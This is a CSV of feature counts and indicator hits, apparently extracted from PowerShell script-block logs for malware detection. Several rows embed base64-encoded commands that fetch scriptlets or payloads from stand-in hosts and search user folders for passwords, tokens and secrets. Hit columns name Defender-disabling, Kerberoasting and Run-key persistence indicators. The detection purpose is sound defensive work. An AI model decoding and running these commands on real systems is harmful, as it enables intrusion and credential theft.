id,lexical_input_source,analysis_length,line_count,token_count,special_char_count,special_char_ratio,digit_ratio,whitespace_ratio,entropy,quoted_literal_count,short_literal_count,joined_literal_length,base64_candidate_count,longest_base64_candidate,decoded_view_count,backtick_count,concat_operator_count,join_operator_count,format_operator_count,char_cast_count,suspicious_mixed_case_count,suspicious_mixed_case_tokens,execution_hit_count,execution_hits,raw_execution_hit_count,recovered_execution_hit_count,decoded_execution_hit_count,download_hit_count,download_hits,raw_download_hit_count,recovered_download_hit_count,decoded_download_hit_count,network_c2_hit_count,network_c2_hits,raw_network_c2_hit_count,recovered_network_c2_hit_count,decoded_network_c2_hit_count,defense_evasion_hit_count,defense_evasion_hits,raw_defense_evasion_hit_count,recovered_defense_evasion_hit_count,decoded_defense_evasion_hit_count,persistence_hit_count,persistence_hits,raw_persistence_hit_count,recovered_persistence_hit_count,decoded_persistence_hit_count,credential_access_hit_count,credential_access_hits,raw_credential_access_hit_count,recovered_credential_access_hit_count,decoded_credential_access_hit_count,lolbin_hit_count,lolbin_hits,raw_lolbin_hit_count,recovered_lolbin_hit_count,decoded_lolbin_hit_count,collection_hit_count,collection_hits,raw_collection_hit_count,recovered_collection_hit_count,decoded_collection_hit_count,remote_execution_hit_count,remote_execution_hits,raw_remote_execution_hit_count,recovered_remote_execution_hit_count,decoded_remote_execution_hit_count,discovery_hit_count,discovery_hits,raw_discovery_hit_count,recovered_discovery_hit_count,decoded_discovery_hit_count,indicator_category_count,high_risk_category_count,raw_indicator_hit_count,indicator_hit_count,recovered_indicator_hit_count,decoded_indicator_hit_count
PST-115,windows_event_4104_scriptblocktext,167,1,17,17,0.101796,0.011976,0.107784,4.759533,2,1,29,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-116,windows_event_4104_scriptblocktext,131,1,12,11,0.083969,0.007634,0.099237,4.644485,1,1,4,0,0,0,0,0,0,0,0,1,Get-NetFirewallRule,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-117,windows_event_4104_scriptblocktext,118,1,14,14,0.118644,0.016949,0.127119,4.472154,2,2,23,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-118,windows_event_4104_scriptblocktext,11,1,2,1,0.090909,0.0,0.090909,3.459432,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-119,windows_event_4104_scriptblocktext,145,1,17,34,0.234483,0.02069,0.062069,4.814075,2,0,87,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-120,windows_event_4104_scriptblocktext,346,1,10,25,0.072254,0.023121,0.008671,5.043671,1,0,224,1,224,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,1,2,1,1,2,1,1
PST-121,windows_event_4104_scriptblocktext,169,1,15,48,0.284024,0.0,0.130178,4.560807,10,10,84,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,0,1,0,0,1,1,0
PST-122,windows_event_4104_scriptblocktext,191,1,22,48,0.251309,0.068063,0.026178,5.032776,1,0,147,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-123,windows_event_4104_scriptblocktext,172,1,13,13,0.075581,0.0,0.081395,4.644128,1,0,43,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-124,windows_event_4104_scriptblocktext,208,1,23,75,0.360577,0.0,0.033654,4.86845,12,12,97,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,invoke-webrequest,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-125,windows_event_4104_scriptblocktext,90,1,10,9,0.1,0.022222,0.111111,4.627205,1,1,16,0,0,0,0,0,0,0,0,2,Get-HotFix;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-126,windows_event_4104_scriptblocktext,69,1,8,14,0.202899,0.014493,0.086957,4.371825,4,4,30,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-127,windows_event_4104_scriptblocktext,83,1,7,12,0.144578,0.0,0.072289,4.586347,1,0,45,0,0,0,0,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-128,windows_event_4104_scriptblocktext,217,1,18,38,0.175115,0.018433,0.115207,4.910011,10,10,134,0,0,1,0,9,0,0,0,3,UAUgBUACcA;VwByAGkAdAB;lAC0ATwB1AHQAcA,2,encodedcommand;windowstyle hidden,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,2,2,0
PST-129,windows_event_4104_scriptblocktext,103,1,8,20,0.194175,0.0,0.106796,4.83702,2,2,9,0,0,0,0,2,0,0,0,2,AuDiTMoDe;SeRvErNaMe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-130,windows_event_4104_scriptblocktext,125,1,10,35,0.28,0.0,0.056,4.871283,1,0,81,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-131,windows_event_4104_scriptblocktext,273,1,20,51,0.186813,0.014652,0.113553,5.0042,11,4,183,0,0,1,0,10,0,0,0,1,ByAGkAdABlAC0AT,2,encodedcommand;scriptblock,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,1,1,0,0,,0,0,0,2,2,1,4,3,0
PST-132,windows_event_4104_scriptblocktext,133,1,16,29,0.218045,0.0,0.045113,4.954992,1,0,93,0,0,0,7,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-133,windows_event_4104_scriptblocktext,75,1,6,6,0.08,0.026667,0.08,4.60745,0,0,0,0,0,0,0,0,0,0,0,2,Get-CimInstance;Win32_LogicalDisk,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-134,windows_event_4104_scriptblocktext,137,1,15,30,0.218978,0.007299,0.029197,4.98675,1,0,97,0,0,0,5,0,0,0,0,0,,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-135,windows_event_4104_scriptblocktext,91,1,11,18,0.197802,0.010989,0.043956,4.574627,1,0,63,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-136,windows_event_4104_scriptblocktext,434,1,10,27,0.062212,0.025346,0.006912,4.859714,1,0,312,1,312,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,2,password;select-string,0,2,2,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,1,3,2,1,4,3,3
PST-137,windows_event_4104_scriptblocktext,132,1,10,25,0.189394,0.007576,0.030303,5.259425,1,0,92,0,0,0,0,0,0,0,0,3,DOwNLoaDstriNg;net.weBcLienT;sTagE.exAMpLE.iNVAlID,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-138,windows_event_4104_scriptblocktext,218,1,18,48,0.220183,0.0,0.050459,4.971298,1,0,180,0,0,0,0,0,0,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-139,windows_event_4104_scriptblocktext,177,1,16,52,0.293785,0.00565,0.124294,4.694712,10,10,92,0,0,0,0,9,0,0,0,0,,1,iex,1,0,0,2,downloadstring;webclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-140,windows_event_4104_scriptblocktext,33,1,3,3,0.090909,0.0,0.090909,3.710576,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-141,windows_event_4104_scriptblocktext,112,1,14,9,0.080357,0.0,0.125,4.384641,1,0,80,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,credential;password,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-142,windows_event_4104_scriptblocktext,172,1,9,11,0.063953,0.023256,0.040698,5.046198,1,0,134,1,72,1,0,0,0,0,0,0,,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-143,windows_event_4104_scriptblocktext,75,1,6,5,0.066667,0.026667,0.08,4.643009,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-144,windows_event_4104_scriptblocktext,108,1,10,10,0.092593,0.027778,0.092593,4.703933,1,1,16,0,0,0,0,0,0,0,0,2,Get-CimInstance;Win32_LogicalDisk,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-145,windows_event_4104_scriptblocktext,306,1,10,25,0.081699,0.03268,0.009804,4.978216,1,0,184,1,184,1,0,0,0,0,0,2,FromBase64String;cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcgBlAGcALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEALgBzAGMAdAAgAHMAYwByAG8AYgBqAC4AZABsAGwA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-146,windows_event_4104_scriptblocktext,132,1,10,25,0.189394,0.007576,0.030303,4.941091,1,0,92,0,0,0,0,0,0,0,0,1,Net.WebClient,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-147,windows_event_4104_scriptblocktext,71,1,6,7,0.098592,0.0,0.084507,4.671818,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-148,windows_event_4104_scriptblocktext,91,1,10,8,0.087912,0.010989,0.10989,4.49811,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-149,windows_event_4104_scriptblocktext,129,1,12,13,0.100775,0.007752,0.100775,4.700964,1,1,8,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-150,windows_event_4104_scriptblocktext,223,1,22,28,0.125561,0.008969,0.080717,4.841949,1,0,183,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-151,windows_event_4104_scriptblocktext,215,1,23,75,0.348837,0.0,0.032558,4.803856,12,12,104,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,start-bitstransfer,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-152,windows_event_4104_scriptblocktext,161,1,19,35,0.217391,0.0,0.049689,5.015305,1,0,119,0,0,0,8,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0
PST-153,windows_event_4104_scriptblocktext,147,1,12,16,0.108844,0.006803,0.07483,5.069398,2,1,66,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,1,0,1,1,0,0
PST-154,windows_event_4104_scriptblocktext,374,1,10,26,0.069519,0.034759,0.008021,4.929627,1,0,252,1,252,1,0,0,0,0,0,2,FromBase64String;UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAFQAeQBwAGUAIABUAFgAVAAgAC0ATgBhAG0AZQAgACcAdABhAHMAawAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkACcAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAUwB0AHIAaQBuAGcAcwA,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,0,1,1,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-155,windows_event_4104_scriptblocktext,166,1,18,16,0.096386,0.024096,0.114458,4.842553,2,2,21,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-156,windows_event_4104_scriptblocktext,289,1,29,87,0.301038,0.00346,0.044983,5.101352,12,9,176,0,0,0,0,0,1,0,0,1,New-ItemPropert,1,windowstyle hidden,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,3,3,0
PST-157,windows_event_4104_scriptblocktext,88,1,8,6,0.068182,0.011364,0.090909,4.558768,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-158,windows_event_4104_scriptblocktext,78,1,8,8,0.102564,0.012821,0.102564,4.52696,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-159,windows_event_4104_scriptblocktext,140,1,17,25,0.178571,0.0,0.071429,4.885523,1,0,100,0,0,0,6,0,0,0,0,1,Resolve-DnsName,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-160,windows_event_4104_scriptblocktext,191,1,22,48,0.251309,0.068063,0.026178,5.390707,1,0,147,0,0,0,0,0,0,0,0,4,MozILlA;STaTuS;StAtUs;c2.ExamPle.inValiD,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-161,windows_event_4104_scriptblocktext,177,1,26,59,0.333333,0.0,0.056497,4.990823,11,10,83,0,0,0,8,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-162,windows_event_4104_scriptblocktext,110,1,10,17,0.154545,0.0,0.063636,4.60657,1,0,70,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-163,windows_event_4104_scriptblocktext,127,1,12,10,0.07874,0.015748,0.094488,4.611445,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetRoute,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-164,windows_event_4104_scriptblocktext,261,1,25,82,0.314176,0.007663,0.099617,4.964987,11,6,167,0,0,0,0,10,0,0,0,1,wc.DownloadSt,0,,0,0,0,2,downloadstring;webclient,1,1,0,2,defaultwebproxy;user-agent,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,0
PST-165,windows_event_4104_scriptblocktext,128,1,9,8,0.0625,0.0,0.070312,4.607767,0,0,0,0,0,0,0,0,0,0,0,1,Get-ComputerInfo,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-166,windows_event_4104_scriptblocktext,234,1,25,88,0.376068,0.0,0.051282,4.720087,13,13,116,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,2,1,0,3,3,0
PST-167,windows_event_4104_scriptblocktext,128,1,13,38,0.296875,0.0,0.054688,4.917441,1,0,84,0,0,0,3,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-168,windows_event_4104_scriptblocktext,119,1,12,30,0.252101,0.016807,0.07563,4.699805,1,0,54,0,0,0,0,0,0,0,0,1,ConvertFrom-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-169,windows_event_4104_scriptblocktext,402,1,10,27,0.067164,0.032338,0.007463,4.949648,1,0,280,1,280,1,0,0,0,0,0,2,FromBase64String;UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQAcwAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AcABhAHkAbABvAGEAZAAuAGIAaQBuACcAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACcAJABlAG4AdgA6AFQARQBNAFAAXABjAGEAYwBoAGUALgBiAGkAbgAnAA,0,,0,0,0,1,start-bitstransfer,0,1,1,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,1
PST-170,windows_event_4104_scriptblocktext,134,1,10,9,0.067164,0.007463,0.074627,4.602468,1,1,16,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-171,windows_event_4104_scriptblocktext,126,1,13,39,0.309524,0.015873,0.134921,4.71937,8,8,53,0,0,0,0,7,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-172,windows_event_4104_scriptblocktext,141,1,13,24,0.170213,0.007092,0.113475,4.90549,3,2,30,0,0,0,0,2,0,0,0,2,AuDiTMoDe;SeRvErNaMe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-173,windows_event_4104_scriptblocktext,111,1,12,10,0.09009,0.018018,0.108108,4.621384,1,1,16,0,0,0,0,0,0,0,0,1,Get-SmbShare,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-174,windows_event_4104_scriptblocktext,87,1,9,7,0.08046,0.011494,0.103448,4.626151,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-175,windows_event_4104_scriptblocktext,146,1,11,29,0.19863,0.0,0.041096,4.786099,1,0,104,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,start-bitstransfer,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
